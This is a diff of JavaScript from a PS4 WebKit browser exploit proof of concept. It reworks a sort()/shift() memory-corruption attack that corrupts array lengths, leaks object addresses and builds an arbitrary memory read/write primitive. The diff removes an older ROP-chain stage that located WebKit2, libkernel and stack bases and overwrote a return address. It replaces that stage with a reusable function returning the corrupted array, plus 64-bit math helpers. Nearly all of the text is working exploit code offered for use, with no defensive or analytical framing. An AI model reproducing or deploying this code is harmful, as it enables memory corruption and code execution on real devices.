@@ -1,14 +1,8 @@
-<html>
-<body>
-<h2>PS4 POC</h2><h3>by nas and Proxima</h3></br>
-<script src="inc/utils.js"></script>
-<script src="inc/jquery.js"></script>
-<script type="text/javascript">
-
 // global vars
 var _gc, _cnt = 0;
+var _u32baseptr;
 
-function tryExplMac64(att)
+function getU32arbitary(att, base_to_set)
 {
 	try {
     //
@@ -31,7 +25,7 @@ function tryExplMac64(att)
 	    {
 	    	// check for the last call for last two array items
 	    	if (y == 3 && x == u32) {
-	    		//logAdd("myCompFunc(u32,3)");
+	    		logAdd("myCompFunc(u32,3)");
 	    		// shift() is calling during sort(), what causes the
 	    		// last array item is written outside the array buffer
 	    		a1.shift();
@@ -44,7 +38,7 @@ function tryExplMac64(att)
 
 	    // check results: a2.length should be overwritten by a1[4]
 	    var len = a2.length;
-	    //logAdd("a2.length = 0x" + len.toString(16));
+	    logAdd("a2.length = 0x" + len.toString(16));
 	    if (len == a2len) { logAdd("error: 1"); return 1; }
 
     //
@@ -55,7 +49,7 @@ function tryExplMac64(att)
 		myCompFunc = function(x,y)
 		{
 	    	if (y == 0 && x == 1) {
-	    		//logAdd("myCompFunc(1,0)");
+	    		logAdd("myCompFunc(1,0)");
 	    		// call shift() again to read the corrupted JSValue from a2.length
 	    		// into a1[3] on the next sort loop
 	    		a1.length = a1len;
@@ -64,7 +58,7 @@ function tryExplMac64(att)
 	    		a2.length = len + 0x18;
 	    	}
 	    	if (y == 3) {
-	    		//logAdd("myCompFunc(x,3)");
+	    		logAdd("myCompFunc(x,3)");
 	    		// shift it back to access a1[3]
 	    		a1.unshift(0);
 	    	}
@@ -75,7 +69,7 @@ function tryExplMac64(att)
 
 		// now a1[3] should contain the corrupted JSValue from a2.length (=len+0x18)
 		var c = a2.length;
-		//logAdd("a2.length = 0x" + c.toString(16));
+		logAdd("a2.length = 0x" + c.toString(16));
 		if (c != len + 0x18) { logAdd("error: 2"); a1[3] = 0; return 2; }
 
 	//
@@ -113,7 +107,7 @@ function tryExplMac64(att)
 		{
 	    	// check for the last call for two last array items
 	    	if (y == 2) {
-	    		//logAdd("myCompFunc(a3[3],2)");
+	    		logAdd("myCompFunc(a3[3],2)");
 	    		// a3[3] will be written over the mo.prop0 object
 	    		a3.shift();
 	    	}
@@ -138,7 +132,7 @@ function tryExplMac64(att)
 	    Object.defineProperty(mo, "prop0", pd);
 
 		// check results: u32.length is taken from f's internals now
-		//logAdd("u32.length = 0x" + u32.length.toString(16));
+		logAdd("u32.length = 0x" + u32.length.toString(16));
 		if (u32.length == u32len) { logAdd("error: 3"); return 3; }
 
 	//
@@ -153,9 +147,6 @@ function tryExplMac64(att)
 		var getU64 = function(offs) {
 			return u32[offs] + u32[offs+1] * 0x100000000;
 		}
-		var getU32 = function(offs) {
-			return u32[offs];
-		}
 		var getObjAddr = function(obj) {
 			// write obj into u32 data
 			pd.set.prop2 = obj;
@@ -165,11 +156,12 @@ function tryExplMac64(att)
 
 		// get the memory address of u32
 		var u32addr = getObjAddr(u32);
-		//logAdd("u32 address = 0x" + u32addr.toString(16));
+		logAdd("u32 address = 0x" + u32addr.toString(16));
+
 		// get the memory address of u32[0] (ArrayBufferView.m_baseAddress)
 		var u32base = getObjAddr(pd.set) + 0x20;
 		var u32base0 = u32base;
-		//logAdd("u32 base = 0x" + u32base.toString(16));
+		logAdd("u32 base = 0x" + u32base.toString(16));
 
 		// on x64 platforms we can't just set u32.length to the huge number
 		// for ability to access arbitrary addresses. We should be able to
@@ -204,9 +196,32 @@ function tryExplMac64(att)
     		Object.defineProperty(mo, "prop0", pd);
 
 			u32base = addr;
-			//logAdd("u32 new base = 0x" + u32base.toString(16));
+			logAdd("u32 new base = 0x" + u32base.toString(16));
 
 			return true;
+		}
+		
+		var getBasePtr = function(){
+			if (!f2) {
+				// search for another JSFunction near "f"
+				for(var i=0x12; i < 0x80; i+=0x10){
+					if ((u32[i] >>> 8) == 0x123456) {
+						f2 = funcs[u32[i] & 0xFF];
+						f2offs = i - 6;
+						f2old = getU64(f2offs);
+						break;
+					}
+				}
+				if (!f2) { return 0; }
+
+			}
+			if (pd.set != f) {
+				pd.set = f;
+    			Object.defineProperty(mo, "prop0", pd);
+    			u32base = u32base0;
+			}
+
+			return f2offs + u32base;
 		}
 
 	// read/write the 64-bit value from the custom address
@@ -224,103 +239,11 @@ function tryExplMac64(att)
 		}
 
 
-		//logAdd("u32 size: 0x" + u32.length.toString(16));
-
-		// Get the object table from the origianl heap address
-		// +0x20 is a pointer we can use for some object
-
-		var xx = getU64from(u32base0+0x20);
-		var yy=0;
-		//logAdd("verify base: 0x"+xx.toString(16) );
-
-		//
-		// This is the only part you need to modify
-		//
-		//
-		//
-		// First, the heap array has a pointer into a function
-		// in WebKit2. The one I'm using is always at +0x20 from
-		// the original base at +0x20.
-
-		// 1.70 PS4 = -0x30bf0 is the start of webkit
-
-		// +0x25C4000 = some data
-		// +0x2414000 = import table
-		// (import table +0x20) =  modules table
-		// If this crashes, try it 2-4 more times. It usually will work
-
-		// target addr for the rop chain
-
-		var chain_addr = u32base0 + 0x80000;
-		var chain_data = u32base0 + 0x88000;
-
-		// xx will be the base address of WebKit2
-
-		xx = (getU64from(xx+0x20)-0x30bf0);
-		var wk_base = xx;
-		logAdd("WebKit2 base address = 0x" + xx.toString(16));
-		xx += 0x2414000; // Get to the import table
-		setBase(xx);
-
-		xx = getU64from(xx+0x20); // Get to the module table
-		// Future use: data area somewhere around 0x200500000
-
-		//logAdd("Dump Address is 0x" + xx.toString(16));
-
-
-		setBase(xx);
-
-		//get libSceLibcinternal base
-		//var libc_int_base = getU64from(xx+0xf98); //1.71
-		var libc_int_base = getU64from(xx+0x1628); //1.71
-
-		//get libkernel base
-		//xx = getU64from(xx+0xdd8); //1.71
-		xx = getU64from(xx+0x1468); //1.76
-		var libkernel_base = xx;
-
-		setBase(xx);
-
-		//get stack base
-		//xx = getU64from(xx+0x3D890); //1.76 webkit2 stack?
-		xx = getU64from(xx+0x5B278); //1.76 webprocess stack
-		//yy = getU64from(xx+0x5AA70); //1.71
-		var stack_base = xx - 0x4000;
-		//yy = getU64from(xx+0x5AA70);
-
-		logAdd("libkernel Base is 0x" + libkernel_base.toString(16));
-		logAdd("libSceLibcinternal Base is 0x" + libc_int_base.toString(16));
-		logAdd("Stack Base is 0x" + stack_base.toString(16));
-		logAdd("Chain Address is 0x" + chain_addr.toString(16));
-
-		//var return_va = 0x2b38; //1.71
-		var return_va = 0x2b38; //1.76
-		//var old_va = getU64from(return_va);
-		//var old_va8 = getU64from(return_va+8);
-
-
-		// ***************** ROP START *********************
-
-		// store data
-		// none
-		// store ROP chain
-		setU64to(chain_addr + 0, wk_base + 735703);
-		// point a return address of the stack to our chain
-		setU64to(stack_base + return_va + 8, chain_addr);
-		setU64to(stack_base + return_va, wk_base + 392117);
-
-		// ***************** ROP END ***********************
-
-		// cleanup
-
-		// restore f2 object
-		if (f2old) {
-			setBase(null); setU64(f2offs, f2old);
-		}
-
-		// delete corrupted property
-		delete mo.prop0;
-
+		logAdd("u32 size: 0x" + u32.length.toString(16));
+		
+		if(base_to_set != 0)
+			setBase(base_to_set);
+		return u32;
 
 	}
 	catch(e) {
@@ -330,39 +253,67 @@ function tryExplMac64(att)
 	return 0;
 }
 
-// "Start" button onclick handler
-function btnClick()
-{
-	try {
-	    logAdd("======== Start ========");
-
-		// check OS version
-		//if (navigator.platform != "MacIntel") { logAdd("<font color=red>This works for Mac OS X only!</>"); return; }
-
-
-
-		// try several attempts to exploit
-		for(var i=1; i < 5; i++){
-			logAdd("<br/>Attempt #" + i + ":");
-			if (tryExplMac64(i) == 0) break;
-		}
-
-		logAdd("<br/>========&nbsp;End &nbsp;========<br/><br/>");
-	}
-	catch(e) {
-	    logAdd(e);
-	}
-
-	_log = null;
+var getU64byOffset = function(offs, u32) {
+	return u32[offs] + u32[offs+1] * 0x100000000;
 }
 
-// print environment info
-writeEnvInfo();
+var toU64 = function(u32_1, u32_2)
+{
+	return u32_1 + u32_2 * 0x100000000;
+}
 
-</script>
+var andU64 = function(u64, mask)
+{
+	var tmp_mask1, tmp_mask2, tmp_u32_1, tmp_u32_2;
+	tmp_mask1 = mask % 0x100000000;
+	tmp_mask2 = mask / 0x100000000;
+	tmp_u32_1 = u64 % 0x100000000;
+	tmp_u32_2 = u64 / 0x100000000;
+	
+	return (tmp_mask1 & tmp_u32_1) + ((tmp_mask2 & tmp_u32_2)*0x100000000);
+}
 
-<button style="width:100px;" onclick="btnClick();">Start</button>
-<br/><br/>
-<div id="log"></div><br>
-</body>
-</html>
+var biggerThenU64 = function(u64_1, u64_2, min, rnd)
+{
+	var tmp_u32_11, tmp_u32_12, tmp_u32_21, tmp_u32_22;
+	tmp_u32_11 = u64_1 % 0x100000000;
+	tmp_u32_12 = u64_2 % 0x100000000;
+	
+	if(tmp_u32_12 < min)
+		return 0;
+	
+	if(tmp_u32_12 < tmp_u32_11)
+		return 1;
+		
+	if(tmp_u32_12 > tmp_u32_11)
+		return 0;	
+	
+	tmp_u32_21 = u64_1 / 0x100000000;
+	tmp_u32_22 = u64_2 / 0x100000000;
+	
+	if(tmp_u32_22 < tmp_u32_21)
+		return 1;
+	else
+		return 0;
+}
+
+var biggerThenU32 = function(tmp_u32_11, tmp_u32_12, tmp_u32_21, tmp_u32_22)
+{
+
+	if(tmp_u32_12 < tmp_u32_11)
+		return 1;
+		
+	if(tmp_u32_12 > tmp_u32_11)
+		return 0;
+		
+	if(tmp_u32_22 < tmp_u32_21)
+		return 1;
+	else
+		return 0;
+}
+
+var toU32 = function(u64)
+{
+	var tmp = [(u64 % 0x100000000), (u64 / 0x100000000)];
+	return tmp;
+}
